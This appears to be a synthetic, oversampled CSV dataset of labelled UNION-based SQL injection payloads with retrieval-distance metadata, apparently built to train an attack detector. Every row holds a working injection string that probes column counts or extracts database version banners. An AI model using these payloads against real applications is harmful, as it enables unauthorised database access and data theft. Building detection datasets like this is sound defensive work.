id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000199,attack,union,"-9178 where 2253  =  2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",nearest_attack_euclidean,R001337,0.10013569504007885
SMOTE_000200,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R001210,0.38450907912924287
SMOTE_000201,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001292,0.05281686790343661
SMOTE_000202,attack,union,"1"" where 8241  =  8241 union all select null,null,null#",nearest_attack_euclidean,R000509,0.3531743445427106
SMOTE_000203,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000944,0.053339535308415245
SMOTE_000204,attack,union,"1'   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000656,0.0833726613827048
SMOTE_000205,attack,union," select * from users where id  =  1 union select .1_,version  (    )   -- 1",nearest_attack_euclidean,R000027,0.45697149176221435
SMOTE_000206,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000690,0.34824989401320045
SMOTE_000207,attack,union,"1'   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000626,0.26922072929706525
SMOTE_000208,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R001312,0.06317097449055356
SMOTE_000209,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R001173,0.7997534267513438
SMOTE_000210,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000886,0.1590185085514268
SMOTE_000211,attack,union,"1' where 6905  =  6905 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001600,0.272765816274141
SMOTE_000212,attack,union,"-9896""   )    )     )   union all select 4073,4073,4073,4073,4073#",nearest_attack_euclidean,R001474,0.1811296766483774
SMOTE_000213,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001637,0.8424457449513938
SMOTE_000214,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001017,0.06303176414577277
SMOTE_000215,attack,union,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000870,0.3682805801254614
SMOTE_000216,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001369,0.05204023511658918
SMOTE_000217,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000827,0.681541616155907
SMOTE_000218,attack,union,"-8203""  )   union all select 6394,6394,6394,6394,6394--",nearest_attack_euclidean,R001022,0.11077923984455475
SMOTE_000219,attack,union,"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001148,0.036944462961835
SMOTE_000220,attack,union,1  )   union all select null#,nearest_attack_euclidean,R001489,1.1186086405382685
SMOTE_000221,attack,union,"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",nearest_attack_euclidean,R001453,0.17688766856916352
SMOTE_000222,attack,union,"1%"" union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000698,0.08263929465713837
SMOTE_000223,attack,union,"-8331'  )   union all select 1452,1452,1452,1452,1452--",nearest_attack_euclidean,R001068,0.07589016531882826
SMOTE_000224,attack,union,"-5438""  )   union all select 3170,3170--",nearest_attack_euclidean,R001255,0.010890499955889504
SMOTE_000225,attack,union,"1""   )    )     )   union all select null,null,null--",nearest_attack_euclidean,R001191,0.3318025919844113
SMOTE_000226,attack,union,"-1031%"" union all select 6832,6832,6832,6832#",nearest_attack_euclidean,R001403,0.43557045464328736
SMOTE_000227,attack,union,"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",nearest_attack_euclidean,R001169,0.25912726794606883
SMOTE_000228,attack,union,"-3437  )   union all select 7774,7774,7774--",nearest_attack_euclidean,R001570,0.30523747642639365
SMOTE_000229,attack,union,"-9408%""   )    )    union all select 1841,1841,1841,1841,1841,1841--",nearest_attack_euclidean,R001664,0.2676329773299987
SMOTE_000230,attack,union,"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000971,0.05613766785939524
SMOTE_000231,attack,union,"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000221,0.08783201192812287
SMOTE_000232,attack,union,"-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#",nearest_attack_euclidean,R000985,0.12104512485787167
SMOTE_000233,attack,union,"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",nearest_attack_euclidean,R000871,0.17846133647570805
SMOTE_000234,attack,union,"-7683""  )   where 9664  =  9664 union all select 9664,9664,9664,9664,9664,9664,9664#",nearest_attack_euclidean,R000361,0.3344887159550398
SMOTE_000235,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000419,1.2036274385750996
SMOTE_000236,attack,union,"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",nearest_attack_euclidean,R000687,0.28240943697036436
SMOTE_000237,attack,union,"-8661"" union all select 5731,5731--",nearest_attack_euclidean,R001630,0.1290550904510819
SMOTE_000238,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000419,0.6563157096260068
SMOTE_000239,attack,union,"-1337""  )   union all select 7508--",nearest_attack_euclidean,R000732,0.34455210423710303
SMOTE_000240,attack,union,"1%'   )    )    union all select null,null,null--",nearest_attack_euclidean,R001080,0.715670618127147
SMOTE_000241,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000661,0.43034426325714226
SMOTE_000242,attack,union,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",nearest_attack_euclidean,R001524,0.10004533131712742
SMOTE_000243,attack,union,"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001386,0.03403775298670147
SMOTE_000244,attack,union,-2050' union all select 5606#,nearest_attack_euclidean,R000442,0.0003469868359184248
SMOTE_000245,attack,union,"1"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001676,0.013095833342953611
SMOTE_000246,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000667,0.03778031019588795
SMOTE_000247,attack,union,"-5292'  )   union all select 1439,1439,1439,1439#",nearest_attack_euclidean,R001289,0.02534749340978962
SMOTE_000248,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R001405,0.3358227530379466
SMOTE_000249,attack,union,"-3035""  )   union all select 7912,7912,7912#",nearest_attack_euclidean,R001236,0.4207069199003821
SMOTE_000250,attack,union,"1   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000942,0.3884310690784985
SMOTE_000251,attack,union,"1'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000368,0.17702598139966996
SMOTE_000252,attack,union,"1%'   )    )     )   union all select null,null#",nearest_attack_euclidean,R000455,0.16666037446178802
SMOTE_000253,attack,union," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000116,0.06404903362271626
SMOTE_000254,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000038,0.9515534350866447
SMOTE_000255,attack,union,"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",nearest_attack_euclidean,R001066,0.04094477451006697
SMOTE_000256,attack,union,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",nearest_attack_euclidean,R000453,0.2152273513524865
SMOTE_000257,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000891,0.25645923048533276
SMOTE_000258,attack,union,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",nearest_attack_euclidean,R000913,0.16780978759064943
SMOTE_000259,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R001210,0.1315606571471612
SMOTE_000260,attack,union,"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",nearest_attack_euclidean,R000871,0.10267133306371631
SMOTE_000261,attack,union,"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",nearest_attack_euclidean,R000423,0.2708356483576232
SMOTE_000262,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R001567,0.005406165168934444
SMOTE_000263,attack,union,"1%""   )    )    union all select null,null--",nearest_attack_euclidean,R001399,0.7430134656821915
SMOTE_000264,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000437,0.17792206312708073
SMOTE_000265,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000422,0.20126991752741458
SMOTE_000266,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000376,0.021297043016775898
SMOTE_000267,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000173,0.006115640486743092
SMOTE_000268,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000131,1.030012175537151
SMOTE_000269,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000586,0.0236482239185035
SMOTE_000270,attack,union,"-7202%""   )    )    union all select 2901#",nearest_attack_euclidean,R001374,1.051428246602562
SMOTE_000271,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R001483,0.17003450698710024
SMOTE_000272,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001017,0.24108198119861865
SMOTE_000273,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,0.27873884258668974
SMOTE_000274,attack,union,"1%""   )    )    union all select null#",nearest_attack_euclidean,R001034,0.6372143151735561
SMOTE_000275,attack,union,"-5150   )    )     )   union all select 5660,5660,5660#",nearest_attack_euclidean,R000797,0.11564148345691593
SMOTE_000276,attack,union,"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001577,0.048179669272886215
SMOTE_000277,attack,union,"-7142'   )    )    union all select 5083,5083,5083,5083#",nearest_attack_euclidean,R000758,0.38594720119945847
SMOTE_000278,attack,union,"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000915,0.06256342712987198
SMOTE_000279,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000185,1.0398905174885145
SMOTE_000280,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000944,0.016222607294262014
SMOTE_000281,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R001219,0.4633710999214198
SMOTE_000282,attack,union,-6165%'   )    )    union all select 5384#,nearest_attack_euclidean,R000407,0.4575406104550398
SMOTE_000283,attack,union,"1 where 9869  =  9869 union all select null,null#",nearest_attack_euclidean,R001411,0.28714369351327523
SMOTE_000284,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,0.5128945984285805
SMOTE_000285,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000988,0.4743903773525672
SMOTE_000286,attack,union,"1%""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000323,0.12862022531054595
SMOTE_000287,attack,union,"-5581%'   )    )     )   union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",nearest_attack_euclidean,R001574,0.851530508666722
SMOTE_000288,attack,union,"-3666""   )    )     )   union all select 4136,4136,4136--",nearest_attack_euclidean,R000512,0.13570325867934502
SMOTE_000289,attack,union,union all select @@version--,nearest_attack_euclidean,R000128,0.8035071969635416
SMOTE_000290,attack,union,"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",nearest_attack_euclidean,R000374,0.16420118717983556
SMOTE_000291,attack,union,"1'   )    )    as kdwc where 5906  =  5906 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000601,0.3968484860300505
SMOTE_000292,attack,union,"1""   )    )    as tngu where 3644  =  3644 union all select null--",nearest_attack_euclidean,R000910,0.2261407231898916
SMOTE_000293,attack,union,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",nearest_attack_euclidean,R000288,0.3408092728238743
SMOTE_000294,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000130,1.6398424284268616
SMOTE_000295,attack,union,"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",nearest_attack_euclidean,R001416,0.08429224050300757
SMOTE_000296,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R001536,0.4283376407887165
SMOTE_000297,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000463,0.22808949026431255
SMOTE_000298,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000434,0.30938223002824616
SMOTE_000299,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000273,0.2939578423466278
SMOTE_000300,attack,union,"-9405'  )   union all select 8283,8283,8283,8283--",nearest_attack_euclidean,R001077,0.16012565579063906
SMOTE_000301,attack,union,"1""   )    )     )   union all select null--",nearest_attack_euclidean,R001366,0.26441750423665555
SMOTE_000302,attack,union,"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",nearest_attack_euclidean,R000663,0.01917262155359742
SMOTE_000303,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000742,0.1847388740398431
SMOTE_000304,attack,union,"-4100'   )    )    union all select 1163,1163,1163--",nearest_attack_euclidean,R000832,0.3264478903399718
SMOTE_000305,attack,union,"1%' union all select null,null,null--",nearest_attack_euclidean,R000853,0.17418305956792318
SMOTE_000306,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R001389,0.2859617566162001
SMOTE_000307,attack,union,"-2254'  )   as dyrv where 9079  =  9079 union all select 9079,9079,9079,9079,9079,9079,9079,9079#",nearest_attack_euclidean,R000906,0.12204995817288439
SMOTE_000308,attack,union,"-2743 union all select 6757,6757,6757,6757,6757,6757--",nearest_attack_euclidean,R000709,0.37433327079393647
SMOTE_000309,attack,union,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",nearest_attack_euclidean,R000598,0.09028059965592439
SMOTE_000310,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000478,0.26893560953055556
SMOTE_000311,attack,union,"1""  )   union all select null,null,null,null#",nearest_attack_euclidean,R000403,0.08653142834638047
SMOTE_000312,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R001287,0.19100689403408308
SMOTE_000313,attack,union,"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",nearest_attack_euclidean,R000386,0.1314008044670456
SMOTE_000314,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.29453223997275646
SMOTE_000315,attack,union,-1876%'  )   union all select 6463--,nearest_attack_euclidean,R000855,0.480365693369928
SMOTE_000316,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000035,13.615416659983486
SMOTE_000317,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000251,0.23646278408627597
SMOTE_000318,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000552,0.011769682665018207
SMOTE_000319,attack,union,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",nearest_attack_euclidean,R000598,0.11292549181116104
SMOTE_000320,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R001248,0.4008355971655027
SMOTE_000321,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R001187,0.37972940256932275
SMOTE_000322,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000263,0.17799079867946246
SMOTE_000323,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000617,0.0337569025659605
SMOTE_000324,attack,union,"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001611,0.1807874169110721
SMOTE_000325,attack,union,"1'  )   where 6328  =  6328 union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001433,0.10873234387293158
SMOTE_000326,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000849,0.5420470210968261
SMOTE_000327,attack,union,"-8580'  )   union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",nearest_attack_euclidean,R001188,0.08460875217161545
SMOTE_000328,attack,union," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000086,0.4357613832318027
SMOTE_000329,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R001266,0.07026730827500272
SMOTE_000330,attack,union,-2452'   )    )     )   union all select 1951--,nearest_attack_euclidean,R000515,0.07835611409217094
SMOTE_000331,attack,union,"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",nearest_attack_euclidean,R001114,0.019770128089487717
SMOTE_000332,attack,union,"-4317""   )    )    as nxvn where 2566  =  2566 union all select 2566,2566,2566#",nearest_attack_euclidean,R001544,0.07512194176150297
SMOTE_000333,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000333,0.30944297236265467
SMOTE_000334,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.20136948388787462
SMOTE_000335,attack,union,"-1204'   )    )    union all select 3585,3585--",nearest_attack_euclidean,R001649,0.4038117126466777
SMOTE_000336,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000860,0.4264591886184781
SMOTE_000337,attack,union,"1""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R001170,0.11299007530075382
SMOTE_000338,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000371,0.25350683654758727
SMOTE_000339,attack,union,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",nearest_attack_euclidean,R000401,0.19847310060936163
SMOTE_000340,attack,union,"1%""   )    )     )   union all select null,null,null--",nearest_attack_euclidean,R000829,0.19831438514053823
SMOTE_000341,attack,union,"-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--",nearest_attack_euclidean,R000296,0.33167769217531434
SMOTE_000342,attack,union,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",nearest_attack_euclidean,R001517,0.3195899584820159
SMOTE_000343,attack,union,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",nearest_attack_euclidean,R000615,0.7646424270968938
SMOTE_000344,attack,union,"-3865'  )   union all select 4935,4935,4935,4935,4935--",nearest_attack_euclidean,R000747,0.01428825498525123
SMOTE_000345,attack,union,"-4406%' union all select 9599,9599,9599,9599#",nearest_attack_euclidean,R001117,0.6003485806405481
SMOTE_000346,attack,union,"-1184""   )    )     )   union all select 1482--",nearest_attack_euclidean,R000233,0.0511525552404893
SMOTE_000347,attack,union,"1'||  (  select 'pygt' from dual where 5543  =  5543 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000907,0.33796995787763995
SMOTE_000348,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R001248,0.24874274327429655
SMOTE_000349,attack,union,"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000633,0.6722873841059319
SMOTE_000350,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R000986,0.0007477872453842915
SMOTE_000351,attack,union,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",nearest_attack_euclidean,R000655,0.3636333175462967
SMOTE_000352,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R001051,0.14543157837199688
SMOTE_000353,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000071,1.1920928955078125e-07
SMOTE_000354,attack,union,"1'   )    )    as popm where 6594  =  6594 union all select null,null#",nearest_attack_euclidean,R000725,0.5793006490510489
SMOTE_000355,attack,union,"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",nearest_attack_euclidean,R001606,0.33499206322666447
SMOTE_000356,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001113,0.1257529930144034
SMOTE_000357,attack,union," select * from users where id  =  1 union select !<@,version  (    )   -- 1",nearest_attack_euclidean,R000202,0.8115995406727757
SMOTE_000358,attack,union,1'   )    )     )   union all select null#,nearest_attack_euclidean,R001316,0.7351706469919557
SMOTE_000359,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.0
SMOTE_000360,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001017,0.3597692565826026
SMOTE_000361,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000068,0.7644720607240383
SMOTE_000362,attack,union,"-1055' union all select 7758,7758,7758,7758,7758,7758--",nearest_attack_euclidean,R001089,0.08426963905161619
SMOTE_000363,attack,union,"-4236  )   union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",nearest_attack_euclidean,R000435,0.2431765401257664
SMOTE_000364,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R001657,0.25283236856346675
SMOTE_000365,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R001251,0.32482320361976946
SMOTE_000366,attack,union,"1  )   where 8630  =  8630 union all select null,null--",nearest_attack_euclidean,R000576,0.17564881161471899
SMOTE_000367,attack,union,"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",nearest_attack_euclidean,R001154,0.23862934491681428
SMOTE_000368,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000590,0.15840830485392224
SMOTE_000369,attack,union,"1   )    )    union all select null,null#",nearest_attack_euclidean,R000869,0.3824170037271536
SMOTE_000370,attack,union,"1'||  (  select 'zdfo' from dual where 4288  =  4288 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R001593,0.302782184510126
SMOTE_000371,attack,union,"-4901' union all select 1536,1536,1536,1536,1536,1536,1536#",nearest_attack_euclidean,R000753,0.06483386560883622
SMOTE_000372,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000901,0.09218736074921974
SMOTE_000373,attack,union,"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000933,0.3926907035298271
SMOTE_000374,attack,union,"1 union all select null,null,null,null,null--",nearest_attack_euclidean,R000569,0.10782231980766818
SMOTE_000375,attack,union," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.008886063733889537
SMOTE_000376,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000371,0.05755041272664732
SMOTE_000377,attack,union," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.1866321626369418
SMOTE_000378,attack,union,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",nearest_attack_euclidean,R000503,0.040439737655150194
SMOTE_000379,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000502,0.5429394943349621
SMOTE_000380,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001111,0.6582971017447842
SMOTE_000381,attack,union," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000154,0.06636541484786422
SMOTE_000382,attack,union,"-4248""   )    )    union all select 9450,9450,9450--",nearest_attack_euclidean,R001073,0.38861486622551544
SMOTE_000383,attack,union,"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",nearest_attack_euclidean,R001134,0.2997560986040327
SMOTE_000384,attack,union,"-1079""  )   where 2865  =  2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",nearest_attack_euclidean,R000896,0.23387754237765077
SMOTE_000385,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000686,0.07295883160551765
SMOTE_000386,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R001354,0.586973844723663
SMOTE_000387,attack,union,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",nearest_attack_euclidean,R000762,0.43717879401454435
SMOTE_000388,attack,union,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",nearest_attack_euclidean,R000289,0.5950040448459636
SMOTE_000389,attack,union,"1   )    )    union all select null,null#",nearest_attack_euclidean,R000869,0.6780655481640416
SMOTE_000390,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001361,0.8703037127469047
SMOTE_000391,attack,union,"-2929""   )    )     )   union all select 8999,8999#",nearest_attack_euclidean,R000446,0.5350483456226802
SMOTE_000392,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000293,0.180755833797666
SMOTE_000393,attack,union,"1' where 4358  =  4358 union all select null,null,null,null--",nearest_attack_euclidean,R001290,0.3997580064307082
SMOTE_000394,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000988,0.35307013153480193
SMOTE_000395,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R001002,0.19547155721581347
